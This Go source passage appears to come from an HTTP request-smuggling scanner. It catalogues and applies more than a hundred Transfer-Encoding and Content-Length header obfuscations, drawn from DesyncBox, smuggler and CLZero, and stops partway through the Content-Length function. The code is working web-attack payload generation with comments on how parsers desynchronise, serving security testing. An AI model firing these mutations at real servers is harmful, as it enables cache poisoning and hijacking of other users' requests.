// Package permute implements all Transfer-Encoding / Content-Length obfuscation
// techniques from DesyncBox.java. Each technique returns the mutated header string
// that replaces "Transfer-Encoding: chunked" (or the whole header line) in the raw
// request bytes.
//
// References:
//   - PortSwigger: https://portswigger.net/research/http-desync-attacks
//   - HTTP/1.1 Must Die: https://portswigger.net/research/http1-must-die
package permute

import (
	"bytes"
	"fmt"
	"strings"
)

// Technique represents a single TE obfuscation technique.
type Technique struct {
	Name        string
	H2Only      bool   // only applicable to HTTP/2 downgrade scenarios
	Description string
}

// All returns the full catalogue of techniques, mirroring DesyncBox.java.
func All() []Technique {
	base := []Technique{
		// ── Shared (H1 + H2) ────────────────────────────────────────────────
		{Name: "vanilla", Description: "Standard Transfer-Encoding: chunked"},
		{Name: "underjoin1", Description: "Transfer_Encoding: chunked"},
		{Name: "spacejoin1", Description: "Transfer Encoding: chunked"},
		{Name: "space1", Description: "Transfer-Encoding : chunked (space before colon)"},
		{Name: "nameprefix1", Description: "Foo: bar\\r\\n Transfer-Encoding: chunked"},
		{Name: "nameprefix2", Description: "Foo: bar\\r\\n\\t Transfer-Encoding: chunked"},
		{Name: "valueprefix1", Description: "Transfer-Encoding:  chunked (extra space after colon)"},
		{Name: "vertwrap", Description: "Transfer-Encoding: chunked\\n\\v"},
		{Name: "connection", Description: "Connection: Transfer-Encoding\\r\\nTransfer-Encoding: chunked"},
		{Name: "spjunk", Description: "Transfer-Encoding x: chunked (space-junk)"},
		{Name: "backslash", Description: "Transfer\\Encoding: chunked"},
		{Name: "spaceFF", Description: "Transfer-Encoding\\xFF: chunked"},
		{Name: "unispace", Description: "Transfer-Encoding\\xa0: chunked"},
		{Name: "commaCow", Description: "Transfer-Encoding: chunked, identity"},
		{Name: "cowComma", Description: "Transfer-Encoding: identity, chunked"},
		{Name: "contentEnc", Description: "Content-Encoding: chunked"},
		{Name: "quoted", Description: `Transfer-Encoding: "chunked"`},
		{Name: "aposed", Description: "Transfer-Encoding: 'chunked'"},
		{Name: "dualchunk", Description: "Transfer-encoding: identity + Transfer-Encoding: chunked"},
		{Name: "lazygrep", Description: "Transfer-Encoding: chunk"},
		{Name: "0dsuffix", Description: "Transfer-Encoding: chunked\\r"},
		{Name: "tabsuffix", Description: "Transfer-Encoding: chunked\\t"},
		{Name: "revdualchunk", Description: "Transfer-Encoding: identity\\r\\nTransfer-Encoding: chunked"},
		{Name: "nested", Description: "Transfer-Encoding: identity, chunked, identity"},
		{Name: "encode", Description: "Transfer-%45ncoding: chunked (URL-encoded E)"},
		{Name: "accentTE", Description: "Transf\\x82r-Encoding: chunked"},
		{Name: "accentCH", Description: "Transfer-Encoding: ch\\x96nked"},
		{Name: "removed", Description: "Transfer-Encoding header completely removed"},
		{Name: "get", Description: "Method changed to GET"},
		{Name: "options", Description: "Method changed to OPTIONS"},
		{Name: "head", Description: "Method changed to HEAD"},
		{Name: "range", Description: "Range: bytes=0-0 added"},
		{Name: "qencode", Description: "Transfer-Encoding: =?iso-8859-1?B?Y2h1bmtlZA==?="},
		{Name: "qencodeutf", Description: "Transfer-Encoding: =?UTF-8?B?Y2h1bmtlZA==?="},
		{Name: "nel", Description: "Transfer-Encoding\\u0085: chunked"},
		{Name: "nbsp", Description: "Transfer-Encoding\\u00a0: chunked"},
		{Name: "shy", Description: "Transfer\\u00adEncoding: chunked"},
		{Name: "shy2", Description: "Transfer-Encoding\\u00ad: chunked"},

		// ── H1-only ──────────────────────────────────────────────────────────
		{Name: "nospace1", Description: "Transfer-Encoding:chunked (no space)"},
		{Name: "linewrapped1", Description: "Transfer-Encoding:\\n chunked"},
		{Name: "doublewrapped", Description: "Transfer-Encoding:\\r\\n \\r\\n chunked"},
		{Name: "gareth1", Description: "Transfer-Encoding\\n :chunked"},
		{Name: "badsetupCR", Description: "Foo: bar\\rTransfer-Encoding: chunked"},
		{Name: "badsetupLF", Description: "Foo: bar\\nTransfer-Encoding: chunked"},
		{Name: "multiCase", Description: "tRANSFER-ENCODING: chunked"},
		{Name: "tabwrap", Description: "Transfer-Encoding: chunked\\r\\n\\t"},
		{Name: "UPPERCASE", Description: "TRANSFER-ENCODING: CHUNKED"},
		{Name: "0dwrap", Description: "Foo: bar\\r\\n\\rTransfer-Encoding: chunked"},
		{Name: "0dspam", Description: "Tra\\rnsfer-Encoding: chunked"},
		{Name: "badwrap", Description: "X-Blah-Ignore replaces TE; TE injected after first CRLF"},
		{Name: "bodysplit", Description: "TE injected inside another header value"},
		{Name: "h1case", Description: "TRANSFER-ENCODING: chunked (header name uppercased)"},
		{Name: "http1.0", Description: "HTTP/1.1 downgraded to HTTP/1.0"},

		// ── H2-only ───────────────────────────────────────────────────────────
		{Name: "http2hide", H2Only: true, Description: "TE hidden inside Foo header (H2 injection)"},
		{Name: "h2colon", H2Only: true, Description: "Transfer-Encoding`chunked : chunked"},
		{Name: "h2auth", H2Only: true, Description: ":authority injection before TE"},
		{Name: "h2path", H2Only: true, Description: ":path injection before TE"},
		{Name: "http2case", H2Only: true, Description: "lowercased headers + transfer-Encoding"},
		{Name: "h2scheme", H2Only: true, Description: ":scheme injection before TE"},
		{Name: "h2name", H2Only: true, Description: "Transfer-Encoding`chunked^~xz: x"},
		{Name: "h2method", H2Only: true, Description: ":method injection before TE"},
		{Name: "h2space", H2Only: true, Description: "Transfer-Encoding chunked : chunked"},
		{Name: "h2prefix", H2Only: true, Description: ":transfer-encoding: chunked"},
		{Name: "h2CL", H2Only: true, Description: "Content-Length: 0 added"},
	}

	// ── Smuggler-derived static TE mutations ─────────────────────────────────
	// Source: github.com/amirnsahmad/smuggler/blob/master/configs/default.py
	base = append(base,
		Technique{Name: "tabprefix2", Description: `Transfer-Encoding\t:\tchunked — tab before and after colon`},
		Technique{Name: "TE-leadspace", Description: `" Transfer-Encoding: chunked" — leading space on header name ("nameprefix1" in smuggler)`},
	)

	// Dynamic spacefix1, prefix1, suffix1, namesuffix1 (original DesyncBox families)
	// + TE-prespace, TE-xprespace, TE-endspacex, TE-rxprespace, TE-xnprespace,
	//   TE-endspacerx, TE-endspacexn (smuggler-derived families)
	// All use the 13-byte set from CLZeroBytes() (same as smuggler).
	for _, i := range specialChars() {
		base = append(base,
			// Original DesyncBox families
			Technique{Name: fmt.Sprintf("spacefix1:%d", i), Description: fmt.Sprintf("Transfer-Encoding:<0x%02x>chunked (midspace)", i)},
			Technique{Name: fmt.Sprintf("prefix1:%d", i), Description: fmt.Sprintf("Transfer-Encoding: <0x%02x>chunked (value prefix)", i)},
			Technique{Name: fmt.Sprintf("suffix1:%d", i), Description: fmt.Sprintf("Transfer-Encoding: chunked<0x%02x> (endspace)", i)},
			Technique{Name: fmt.Sprintf("namesuffix1:%d", i), Description: fmt.Sprintf("Transfer-Encoding<0x%02x>: chunked (postspace)", i)},
			// Smuggler-derived families
			Technique{Name: fmt.Sprintf("TE-prespace:%d", i), Description: fmt.Sprintf("<0x%02x>Transfer-Encoding: chunked (leading byte on header name)", i)},
			Technique{Name: fmt.Sprintf("TE-xprespace:%d", i), Description: fmt.Sprintf("X: X<0x%02x>Transfer-Encoding: chunked (prev-header bleed)", i)},
			Technique{Name: fmt.Sprintf("TE-endspacex:%d", i), Description: fmt.Sprintf("Transfer-Encoding: chunked<0x%02x>X: X (value bleed into dummy)", i)},
			Technique{Name: fmt.Sprintf("TE-rxprespace:%d", i), Description: fmt.Sprintf("X: X\\r<0x%02x>Transfer-Encoding: chunked (CR+byte between headers)", i)},
			Technique{Name: fmt.Sprintf("TE-xnprespace:%d", i), Description: fmt.Sprintf("X: X<0x%02x>\\nTransfer-Encoding: chunked (byte+LF between headers)", i)},
			Technique{Name: fmt.Sprintf("TE-endspacerx:%d", i), Description: fmt.Sprintf("Transfer-Encoding: chunked\\r<0x%02x>X: X (CR+byte after value)", i)},
			Technique{Name: fmt.Sprintf("TE-endspacexn:%d", i), Description: fmt.Sprintf("Transfer-Encoding: chunked<0x%02x>\\nX: X (byte+LF after value)", i)},
		)
	}

	// CL permutations (used in CL.TE context)
	base = append(base,
		Technique{Name: "CL-plus", Description: "Content-Length: +<n>"},
		Technique{Name: "CL-minus", Description: "Content-Length: -<n>"},
		Technique{Name: "CL-pad", Description: "Content-Length: 0<n>"},
		Technique{Name: "CL-bigpad", Description: "Content-Length: 00000000000<n>"},
		Technique{Name: "CL-e", Description: "Content-Length: <n>e0"},
		Technique{Name: "CL-dec", Description: "Content-Length: <n>.0"},
		Technique{Name: "CL-commaprefix", Description: "Content-Length: 0, <n>"},
		Technique{Name: "CL-commasuffix", Description: "Content-Length: <n>, 0"},
		Technique{Name: "CL-expect", Description: "Expect: 100-continue added"},
		Technique{Name: "CL-expect-obfs", Description: "Expect: x 100-continue"},
		Technique{Name: "CL-error", Description: "Invalid header injected before CL"},
		Technique{Name: "CL-spacepad", Description: "Content-Length: <n> (trailing space)"},
	)

	// ── Dual CL header attacks ────────────────────────────────────────────────
	base = append(base,
		Technique{Name: "CL-dual-zero-first", Description: `Content-Length: 0\r\nContent-Length: <n> — front picks 0, back picks <n> or vice versa`},
		Technique{Name: "CL-dual-zero-last", Description: `Content-Length: <n>\r\nContent-Length: 0 — front picks <n>, back picks 0 or vice versa`},
	)

	// ── CLZero-derived static CL mutations ───────────────────────────────────
	// Source: github.com/Moopinger/CLZero/blob/main/configs/default.py
	base = append(base,
		Technique{Name: "CL-alpha", Description: `Content-Length: <n>aa (alpha suffix — "normalize" in CLZero)`},
		Technique{Name: "CL-subtract", Description: `Content-Length: <n>-0 (arithmetic suffix — "subtract" in CLZero)`},
		Technique{Name: "CL-under", Description: `Content_Length: <n> (underscore in name — "underjoin1" in CLZero)`},
		Technique{Name: "CL-smashed", Description: `Content Length:<n> (space in name, no space after colon — "smashed" in CLZero)`},
	)

	// ── CLZero dynamic CL byte-family mutations ───────────────────────────────
	// 10 position families × 13 special byte values = 130 permutations.
	clFamilies := [10]string{
		"CL-midspace",    // byte replaces space between colon and value
		"CL-postspace",   // byte injected before the colon
		"CL-prespace",    // byte prepended to the header name
		"CL-endspace",    // byte appended after the value
		"CL-xprespace",   // prev-header value bleeds into CL via byte (no CRLF)
		"CL-endspacex",   // CL value bleeds into dummy token via byte
		"CL-rxprespace",  // CR + byte between two headers
		"CL-xnprespace",  // byte + LF between two headers
		"CL-endspacerx",  // CR + byte after CL value
		"CL-endspacexn",  // byte + LF after CL value
	}
	for _, b := range CLZeroBytes() {
		sfx := fmt.Sprintf("-%02x", b)
		for _, fam := range clFamilies {
			base = append(base, Technique{
				Name:        fam + sfx,
				Description: fmt.Sprintf("%s with byte 0x%02x", fam, b),
			})
		}
	}

	return base
}

// H1Techniques returns techniques that apply to HTTP/1.1 (non-H2-only).
func H1Techniques() []Technique {
	var out []Technique
	for _, t := range All() {
		if !t.H2Only {
			out = append(out, t)
		}
	}
	return out
}

// ApplyTE applies a named technique to the raw request bytes, mutating the
// Transfer-Encoding header (or the request structure as needed).
// Returns the mutated request, or nil if the technique had no effect.
func ApplyTE(req []byte, technique string) []byte {
	const teHeader = "Transfer-Encoding: "
	const teValue = "chunked"
	const teFull = "Transfer-Encoding: chunked"

	result := req

	switch technique {
	case "vanilla":
		return req

	case "underjoin1":
		result = replaceBytes(req, []byte(teHeader), []byte("Transfer_Encoding: "))

	case "spacejoin1":
		result = replaceBytes(req, []byte(teHeader), []byte("Transfer Encoding: "))

	case "space1":
		result = replaceBytes(req, []byte(teHeader), []byte("Transfer-Encoding : "))

	case "nameprefix1":
		result = replaceBytes(req, []byte(teHeader), []byte("Foo: bar\r\n "+teHeader))

	case "nameprefix2":
		result = replaceBytes(req, []byte(teHeader), []byte("Foo: bar\r\n\t"+teHeader))

	case "valueprefix1":
		result = replaceBytes(req, []byte(teHeader), []byte(teHeader+" "))

	case "nospace1":
		result = replaceBytes(req, []byte(teHeader), []byte("Transfer-Encoding:"))

	case "linewrapped1":
		result = replaceBytes(req, []byte(teFull), []byte("Transfer-Encoding:\n chunked"))

	case "doublewrapped":
		result = replaceBytes(req, []byte(teFull), []byte("Transfer-Encoding:\r\n \r\n chunked"))

	case "gareth1":
		result = replaceBytes(req, []byte(teHeader), []byte("Transfer-Encoding\n :"))

	case "badsetupCR":
		result = replaceBytes(req, []byte(teHeader), []byte("Foo: bar\r"+teHeader))

	case "badsetupLF":
		result = replaceBytes(req, []byte(teHeader), []byte("Foo: bar\n"+teHeader))

	case "vertwrap":
		result = replaceBytes(req, []byte(teFull), []byte(teFull+"\n\x0b"))

	case "tabwrap":
		result = replaceBytes(req, []byte(teFull), []byte(teFull+"\r\n\t"))

	case "multiCase":
		upper := strings.ToUpper(teHeader)
		mutated := strings.ToLower(upper[:1]) + upper[1:]
		result = replaceBytes(req, []byte(teHeader), []byte(mutated))

	case "UPPERCASE":
		result = replaceBytes(req, []byte(teHeader), []byte(strings.ToUpper(teHeader)))

	case "h1case":
		result = replaceBytes(req, []byte(teFull), []byte(strings.ToUpper(teHeader)+teValue))

	case "0dwrap":
		result = replaceBytes(req, []byte(teHeader), []byte("Foo: bar\r\n\r"+teHeader))

	case "0dspam":
		result = replaceBytes(req, []byte("Tra"), []byte("Tra\r"))

	case "badwrap":
		tmp := replaceBytes(req, []byte(teHeader), []byte("X-Blah-Ignore: "))
		result = replaceFirstBytes(tmp, []byte("\r\n"), []byte("\r\n "+teFull+"\r\n"))

	case "bodysplit":
		tmp := replaceBytes(req, []byte(teFull), []byte("X: y"))
		tmp = addOrReplaceHeader(tmp, "Foo", "barzxaazz")
		result = replaceBytes(tmp, []byte("barzxaazz"), []byte("barn\n\n"+teFull))

	case "connection":
		result = replaceBytes(req, []byte(teHeader), []byte("Connection: Transfer-Encoding\r\n"+teHeader))

	case "spjunk":
		result = replaceBytes(req, []byte(teHeader), []byte("Transfer-Encoding x: "))

	case "backslash":
		result = replaceBytes(req, []byte(teHeader), []byte("Transfer\\Encoding: "))

	case "nel":
		result = replaceBytes(req, []byte(teHeader), []byte("Transfer-Encoding\u0085: "))

	case "nbsp":
		result = replaceBytes(req, []byte(teHeader), []byte("Transfer-Encoding\u00a0: "))

	case "shy2":
		result = replaceBytes(req, []byte(teHeader), []byte("Transfer-Encoding\u00ad: "))

	case "shy":
		result = replaceBytes(req, []byte("Transfer-Encoding"), []byte("Transfer\u00adEncoding"))

	case "commaCow":
		result = replaceBytes(req, []byte(teFull), []byte(teFull+", identity"))

	case "cowComma":
		result = replaceBytes(req, []byte(teHeader), []byte(teHeader+"identity, "))

	case "contentEnc":
		result = replaceBytes(req, []byte(teHeader), []byte("Content-Encoding: "))

	case "quoted":
		result = replaceBytes(req, []byte(teFull), []byte(`Transfer-Encoding: "chunked"`))

	case "aposed":
		result = replaceBytes(req, []byte(teFull), []byte("Transfer-Encoding: 'chunked'"))

	case "dualchunk":
		// INSERT Transfer-encoding: identity alongside the existing Transfer-Encoding: chunked.
		// addOrReplaceHeader would REPLACE chunked with identity (case-insensitive match),
		// leaving no real chunked header — back-end couldn't parse as chunked.
		// appendHeader inserts without checking for existing headers of the same name,
		// producing: Transfer-Encoding: chunked\r\nTransfer-encoding: identity (both present).
		result = appendHeader(req, "Transfer-encoding", "identity")

	case "lazygrep":
		result = replaceBytes(req, []byte(teFull), []byte("Transfer-Encoding: chunk"))

	case "revdualchunk":
		result = replaceBytes(req, []byte(teFull), []byte("Transfer-Encoding: identity\r\nTransfer-Encoding: chunked"))

	case "nested":
		result = replaceBytes(req, []byte(teFull), []byte("Transfer-Encoding: identity, chunked, identity"))

	case "http2hide":
		result = replaceBytes(req, []byte(teFull), []byte("Foo: b\r\nTransfer-Encoding: chunked\r\nx: x"))

	case "encode":
		result = replaceBytes(req, []byte(teFull), []byte("Transfer-%45ncoding: chunked"))

	case "h2colon":
		result = replaceBytes(req, []byte(teFull), []byte("Transfer-Encoding`chunked : chunked"))

	case "http2case":
		lower := bytes.ToLower(req)
		result = replaceBytes(lower, []byte(strings.ToLower(teFull)), []byte("x-reject: 1\r\ntransfer-Encoding: chunked"))

	case "h2name":
		result = replaceBytes(req, []byte(teFull), []byte("Transfer-Encoding`chunked\r\nxz: x"))

	case "h2space":
		result = replaceBytes(req, []byte(teFull), []byte("Transfer-Encoding chunked : chunked"))

	case "h2prefix":
		result = replaceBytes(req, []byte(teFull), []byte(":transfer-encoding: chunked"))

	case "qencode":
		result = replaceBytes(req, []byte(teFull), []byte("Transfer-Encoding: =?iso-8859-1?B?Y2h1bmtlZA==?="))

	case "qencodeutf":
		result = replaceBytes(req, []byte(teFull), []byte("Transfer-Encoding: =?UTF-8?B?Y2h1bmtlZA==?="))

	case "0dsuffix":
		result = replaceBytes(req, []byte(teFull), []byte(teFull+"\r"))

	case "tabsuffix":
		result = replaceBytes(req, []byte(teFull), []byte(teFull+"\t"))

	case "removed":
		result = replaceBytes(req, []byte(teFull), []byte("Nothing-interesting: 1"))

	case "get":
		result = SetMethod(req, "GET")

	case "options":
		result = SetMethod(req, "OPTIONS")

	case "head":
		result = SetMethod(req, "HEAD")

	case "range":
		result = addOrReplaceHeader(req, "Range", "bytes=0-0")

	case "http1.0":
		result = replaceFirstBytes(req, []byte("HTTP/1.1"), []byte("HTTP/1.0"))

	// ── Smuggler-derived static TE mutations ─────────────────────────────────
	// Source: github.com/amirnsahmad/smuggler/blob/master/configs/default.py
	case "tabprefix2":
		// Transfer-Encoding\t:\tchunked — tab both before and after the colon.
		// Distinct from tabprefix1 (spacefix1:9 = tab only after colon, no space).
		result = replaceBytes(req, []byte(teHeader), []byte("Transfer-Encoding\t:\t"))
	case "TE-leadspace":
		// " Transfer-Encoding: chunked" — leading space on the header name.
		// Known as "nameprefix1" in smuggler. Different from our "nameprefix1"
		// which prefixes a full "Foo: bar\r\n" continuation line.
		// Leading whitespace before the header name is illegal per RFC 7230 §3.2.4
		// but some proxies normalise it, exposing the discrepancy to back-ends.
		result = replaceBytes(req, []byte(teHeader), []byte(" "+teHeader))

	case "h2CL":
		result = addOrReplaceHeader(req, "Content-Length", "0")
		return result

	case "spaceFF":
		oldHeader := []byte(teHeader)
		newHeader := make([]byte, len(oldHeader)-1)
		copy(newHeader, oldHeader[:len(oldHeader)-1])
		newHeader[len(newHeader)-1] = 0xFF
		result = replaceBytes(req, oldHeader, newHeader)

	case "unispace":
		oldHeader := []byte(teHeader)
		newHeader := make([]byte, len(oldHeader)-1)
		copy(newHeader, oldHeader[:len(oldHeader)-1])
		newHeader[len(newHeader)-1] = 0xa0
		result = replaceBytes(req, oldHeader, newHeader)

	case "accentTE":
		var buf bytes.Buffer
		buf.WriteString("Transf")
		buf.WriteByte(0x82)
		buf.WriteString("r-Encoding: ")
		result = replaceBytes(req, []byte(teHeader), buf.Bytes())

	case "accentCH":
		var buf bytes.Buffer
		buf.WriteString("Transfer-Encoding: ch")
		buf.WriteByte(0x96)
		result = replaceBytes(req, []byte("Transfer-Encoding: chu"), buf.Bytes())

	case "h2auth":
		host := extractHost(req)
		replacement := ":authority: " + host + ":443\r\n" + teFull + "\r\nx: x"
		result = replaceBytes(req, []byte(teFull), []byte(replacement))

	case "h2path":
		path := extractPath(req)
		replacement := ":path: " + path + " HTTP/1.1\r\n" + teFull + "\r\nx: x"
		result = replaceBytes(req, []byte(teFull), []byte(replacement))

	case "h2scheme":
		host := extractHost(req)
		path := extractPath(req)
		replacement := ":scheme: https://" + host + path + " HTTP/1.1\r\n" + teFull + "\r\nx: x"
		result = replaceBytes(req, []byte(teFull), []byte(replacement))

	case "h2method":
		path := extractPath(req)
		replacement := ":method: POST " + path + " HTTP/1.1\r\n" + teFull + "\r\nx: x"
		result = replaceBytes(req, []byte(teFull), []byte(replacement))

	default:
		// Dynamic techniques:
		//   Original (DesyncBox): spacefix1:N, prefix1:N, suffix1:N, namesuffix1:N
		//   Smuggler-derived:     TE-prespace:N, TE-xprespace:N, TE-endspacex:N,
		//                         TE-rxprespace:N, TE-xnprespace:N,
		//                         TE-endspacerx:N, TE-endspacexn:N
		// All families iterated over 13 special bytes (same set as CLZeroBytes).
		for _, sc := range specialChars() {
			b := []byte{byte(sc)}

			if technique == fmt.Sprintf("spacefix1:%d", sc) {
				// Transfer-Encoding:<byte>chunked — byte replaces the space after colon.
				// Known as "midspace" in smuggler.
				old := []byte(teHeader)
				newH := append([]byte("Transfer-Encoding:"), b...)
				result = replaceBytes(req, old, newH)
				goto done
			}
			if technique == fmt.Sprintf("prefix1:%d", sc) {
				// Transfer-Encoding: <byte>chunked — byte injected between space and value.
				// Not in smuggler; tests parsers that strip leading garbage from the value.
				old := []byte("Transfer-Encoding: chunked")
				newH := append([]byte("Transfer-Encoding: "), b...)
				newH = append(newH, []byte("chunked")...)
				result = replaceBytes(req, old, newH)
				goto done
			}
			if technique == fmt.Sprintf("suffix1:%d", sc) {
				// Transfer-Encoding: chunked<byte> — byte appended after the value.
				// Known as "endspace" in smuggler.
				old := []byte(teFull)
				newH := append([]byte(teFull), b...)
				result = replaceBytes(req, old, newH)
				goto done
			}
			if technique == fmt.Sprintf("namesuffix1:%d", sc) {
				// Transfer-Encoding<byte>: chunked — byte injected before the colon.
				// Known as "postspace" in smuggler.
				result = replaceBytes(req, []byte("Transfer-Encoding:"), append(append([]byte("Transfer-Encoding"), b...), ':'))
				goto done
			}

			// ── Smuggler-derived dynamic families ──────────────────────────────
			// Source: github.com/amirnsahmad/smuggler/blob/master/configs/default.py
			if technique == fmt.Sprintf("TE-prespace:%d", sc) {
				// <byte>Transfer-Encoding: chunked — byte prepended to the header name.
				// Front-end may discard the unknown header; back-end strips the byte → TE.
				result = replaceBytes(req, []byte(teFull), append(b, []byte(teFull)...))
				goto done
			}
			if technique == fmt.Sprintf("TE-xprespace:%d", sc) {
				// X: X<byte>Transfer-Encoding: chunked
				// Previous header value bleeds into TE name via byte (no CRLF between them).
				result = replaceBytes(req, []byte(teFull),
					append(append([]byte("X: X"), b...), []byte(teFull)...))
				goto done
			}
			if technique == fmt.Sprintf("TE-endspacex:%d", sc) {
				// Transfer-Encoding: chunked<byte>X: X
				// TE value bleeds into a dummy subsequent token via the byte.
				result = replaceBytes(req, []byte(teFull),
					append(append([]byte(teFull), b...), []byte("X: X")...))
				goto done
			}
			if technique == fmt.Sprintf("TE-rxprespace:%d", sc) {
				// X: X\r<byte>Transfer-Encoding: chunked — CR + byte between two headers.
				result = replaceBytes(req, []byte(teFull),
					append(append([]byte("X: X\r"), b...), []byte(teFull)...))
				goto done
			}
			if technique == fmt.Sprintf("TE-xnprespace:%d", sc) {
				// X: X<byte>\nTransfer-Encoding: chunked — byte + LF between two headers.
				result = replaceBytes(req, []byte(teFull),
					append(append(append([]byte("X: X"), b...), '\n'), []byte(teFull)...))
				goto done
			}
			if technique == fmt.Sprintf("TE-endspacerx:%d", sc) {
				// Transfer-Encoding: chunked\r<byte>X: X — CR + byte after TE value.
				result = replaceBytes(req, []byte(teFull),
					append(append(append([]byte(teFull), '\r'), b...), []byte("X: X")...))
				goto done
			}
			if technique == fmt.Sprintf("TE-endspacexn:%d", sc) {
				// Transfer-Encoding: chunked<byte>\nX: X — byte + LF after TE value.
				result = replaceBytes(req, []byte(teFull),
					append(append(append([]byte(teFull), b...), '\n'), []byte("X: X")...))
				goto done
			}
		}
	}

done:
	if bytes.Equal(result, req) && technique != "vanilla" {
		return nil // no effect — skip
	}
	return result
}

// ApplyCL applies a CL-mutation technique to the Content-Length header.
func ApplyCL(req []byte, technique, clValue string) []byte {
	const clHeader = "Content-Length: "

	switch technique {
	case "CL-plus":
		return replaceBytes(req, []byte(clHeader+clValue), []byte(clHeader+"+"+clValue))
	case "CL-minus":
		return replaceBytes(req, []byte(clHeader+clValue), []byte(clHeader+"-"+clValue))
	case "CL-pad":
		return replaceBytes(req, []byte(clHeader+clValue), []byte(clHeader+"0"+clValue))
	case "CL-bigpad":
		return replaceBytes(req, []byte(clHeader+clValue), []byte(clHeader+"00000000000"+clValue))
	case "CL-spacepad":
		return replaceBytes(req, []byte(clHeader+clValue), []byte(clHeader+clValue+" "))
	case "CL-e":
		return replaceBytes(req, []byte(clHeader+clValue), []byte(clHeader+clValue+"e0"))
	case "CL-dec":
		return replaceBytes(req, []byte(clHeader+clValue), []byte(clHeader+clValue+".0"))
	case "CL-commaprefix":
		return replaceBytes(req, []byte(clHeader+clValue), []byte(clHeader+"0, "+clValue))
	case "CL-commasuffix":
		return replaceBytes(req, []byte(clHeader+clValue), []byte(clHeader+clValue+", 0"))
	case "CL-expect":
		return addOrReplaceHeader(req, "Expect", "100-continue")
	case "CL-expect-obfs":
		return addOrReplaceHeader(req, "Expect", "x 100-continue")
	case "CL-error":
		return replaceBytes(req, []byte(clHeader+clValue), []byte("X-Invalid Y: \r\n"+clHeader+clValue))

	// ── Dual Content-Length header attacks ──────────────────────────────────
	// Send two Content-Length headers with conflicting values.
	// RFC 7230 §3.3.2 says the request MUST be rejected if two CL values differ;
	// in practice proxies and back-ends disagree on which one wins:
	//   - Some proxies take the FIRST CL; some back-ends take the LAST → desync.
	//   - Some proxies take the LAST CL; some back-ends take the FIRST → desync.
	// Both orderings are tested independently.
	case "CL-dual-zero-first":
		// "Content-Length: 0\r\nContent-Length: <n>"
		// Front-end that takes the FIRST CL (=0) forwards 0 bytes of body;
		// back-end that takes the LAST CL (=<n>) tries to read <n> bytes → timeout.
		// Back-end that takes the FIRST (=0) treats body as next pipelined request → CL.0.
		return replaceBytes(req, []byte(clHeader+clValue), []byte("Content-Length: 0\r\n"+clHeader+clValue))
	case "CL-dual-zero-last":
		// "Content-Length: <n>\r\nContent-Length: 0"
		// Front-end that takes the LAST CL (=0) forwards 0 bytes;
		// back-end that takes the FIRST CL (=<n>) reads full body → no desync.
		// Front-end that takes the FIRST CL (=<n>) forwards full body;
		// back-end that takes the LAST (=0) treats body as next request → CL.0.
		return replaceBytes(req, []byte(clHeader+clValue), []byte(clHeader+clValue+"\r\nContent-Length: 0"))

	// ── Header injection / obs-fold techniques ──────────────────────────────
	// Source: Burp Suite HTTP Request Smuggler CL.0 scanner (observed payloads).
	// These techniques inject the Content-Length via a preceding header's value
	// using parser confusion from bare CR/LF or RFC 7230 obs-fold sequences.
	case "CL-none":
		// Remove Content-Length entirely — body present with no CL declared.
		// The back-end must infer body length from context; many treat it as CL=0
		// and leave the body bytes in the TCP buffer → true CL.0.
		clLine := []byte(clHeader + clValue + "\r\n")
		return bytes.Replace(req, clLine, nil, 1)
	case "CL-connection-strip":
		// Connection: Content-Length — lists CL as hop-by-hop.
		// A stripping proxy removes the CL header before forwarding; the back-end
		// receives a request with a body but no CL → treats it as CL.0.
		return replaceBytes(req, []byte(clHeader+clValue),
			[]byte("Connection: Content-Length\r\n"+clHeader+clValue))
	case "CL-badsetupCR":
		// Foo: bar\rContent-Length: <n>
		// Bare CR in a preceding header's value. Some parsers treat \r as a line
		// terminator, splitting the line into "Foo: bar" + "Content-Length: <n>".
		return replaceBytes(req, []byte(clHeader+clValue),
			[]byte("Foo: bar\r"+clHeader+clValue))
	case "CL-badsetupLF":
		// Foo: bar\nContent-Length: <n>
		// Same as CL-badsetupCR but with a bare LF instead of CR.
		return replaceBytes(req, []byte(clHeader+clValue),
			[]byte("Foo: bar\n"+clHeader+clValue))
	case "CL-0dwrap":
		// Foo: bar\r\n\rContent-Length: <n>
		// CRLF + bare CR before CL. The bare CR after the fold tricks parsers that
		// normalise CR to LF into treating the CL as a standalone header line.
		return replaceBytes(req, []byte(clHeader+clValue),
			[]byte("Foo: bar\r\n\r"+clHeader+clValue))
	case "CL-nameprefix1":
		// Foo: bar\r\n Content-Length: <n>  (obs-fold with space)
		// RFC 7230 §3.2.6 obs-fold: a line starting with SP/HTAB is a continuation
		// of the previous header. Some servers still honour obs-fold and join the
		// lines; others see CL as a new header → discrepancy.
		return replaceBytes(req, []byte(clHeader+clValue),
			[]byte("Foo: bar\r\n "+clHeader+clValue))
	case "CL-nameprefix2":
		// Foo: bar\r\n\tContent-Length: <n>  (obs-fold with tab)
		return replaceBytes(req, []byte(clHeader+clValue),
			[]byte("Foo: bar\r\n\t"+clHeader+clValue))
	case "CL-range":
		// Add Range: bytes=0-0 after the Content-Length header.
		// Some caches/proxies use Range to split the response; combined with a
		// body-bearing request it can expose CL.0 on range-aware intermediaries.
		return replaceBytes(req, []byte(clHeader+clValue),
			[]byte(clHeader+clValue+"\r\nRange: bytes=0-0"))

	// ── CLZero-derived static mutations ─────────────────────────────────────
	// Source: github.com/Moopinger/CLZero/blob/main/configs/default.py
	case "CL-alpha":
		// "Content-Length: <n>aa" — alpha suffix; parsers expecting digits-only reject the value
		return replaceBytes(req, []byte(clHeader+clValue), []byte(clHeader+clValue+"aa"))
	case "CL-subtract":
		// "Content-Length: <n>-0" — arithmetic suffix some parsers evaluate to 0
		return replaceBytes(req, []byte(clHeader+clValue), []byte(clHeader+clValue+"-0"))
	case "CL-under":
		// "Content_Length: <n>" — underscore replaces hyphen; most proxies ignore this header
		return replaceBytes(req, []byte(clHeader+clValue), []byte("Content_Length: "+clValue))
	case "CL-smashed":
		// "Content Length:<n>" — space in name + no space after colon; parser confusion
		return replaceBytes(req, []byte(clHeader+clValue), []byte("Content Length:"+clValue))
	}

	// ── CLZero dynamic byte-family mutations ─────────────────────────────────
	// 10 position families × 13 special byte values = 130 permutations.
	// Each family injects a single byte into a specific structural position of the
	// Content-Length header line to exploit parsing discrepancies between components.
	clFull := []byte(clHeader + clValue)
	for _, b := range CLZeroBytes() {
		sfx := fmt.Sprintf("-%02x", b)
		bc := []byte{byte(b)}

		switch technique {
		case "CL-midspace" + sfx:
			// Content-Length:<byte><value> — byte replaces the space between colon and value
			return bytes.Join([][]byte{[]byte("Content-Length:"), bc, []byte(clValue)}, nil)
		case "CL-postspace" + sfx:
			// Content-Length<byte>: <value> — byte injected immediately before the colon
